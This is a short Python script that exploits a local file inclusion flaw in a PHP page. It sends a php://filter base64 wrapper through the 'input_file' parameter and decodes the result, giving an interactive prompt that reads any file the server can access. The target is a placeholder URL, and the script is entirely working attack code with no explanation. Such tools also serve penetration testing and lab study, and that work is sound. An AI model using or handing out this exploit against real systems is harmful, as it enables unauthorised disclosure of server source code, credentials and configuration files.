#!/usr/bin/env python3

import requests
from base64 import b64decode
import re

def GetFile(file):
    payload = { 'input_file': 'php://filter/read=convert.base64-encode/resource='+ file }
    resp = (requests.get('%s' % url, params=payload).text).strip()
    return b64decode(resp)

global url

# Settings
url = 'http://xxx.xxx.xxx/lfi.php'

while True:
    cmd = input("> ")
    try:
        output = GetFile(cmd)
        print(output.decode())
    except:
        print("ERROR")
